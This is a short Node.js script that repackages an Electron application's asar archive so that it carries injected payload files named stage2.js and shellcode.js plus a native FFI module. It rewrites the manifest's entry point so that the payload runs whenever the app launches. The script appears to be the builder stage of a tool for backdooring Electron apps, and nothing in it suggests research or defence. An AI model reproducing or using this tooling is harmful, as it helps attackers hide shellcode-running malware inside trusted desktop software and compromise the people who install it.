
const fs = require("fs");
const path = require("path");
const asar = require("@electron/asar");

async function build(src, origAsar, outAsar) {
  fs.cpSync(src, ".tmp", { recursive: true });
  fs.copyFileSync(path.join(__dirname, "payload", "stage2.js"), path.join(".tmp", "stage2.js"));
  fs.copyFileSync(path.join(__dirname, "payload", "shellcode.js"), path.join(".tmp", "shellcode.js"));
  fs.copyFileSync(path.join(__dirname, "node_modules", "@koromix", "koffi-win32-x64", "win32_x64", "koffi.node"), path.join(".tmp", "koffi.node"));
  const pkgPath = path.join(".tmp", "package.json");
  const manifest = JSON.parse(fs.readFileSync(pkgPath, "utf8"));
  manifest.main = "stage2.js";
  fs.writeFileSync(pkgPath, JSON.stringify(manifest, null, 2));
  await asar.createPackage(".tmp", outAsar);
  return asar.extractFile(outAsar, "package.json");
}
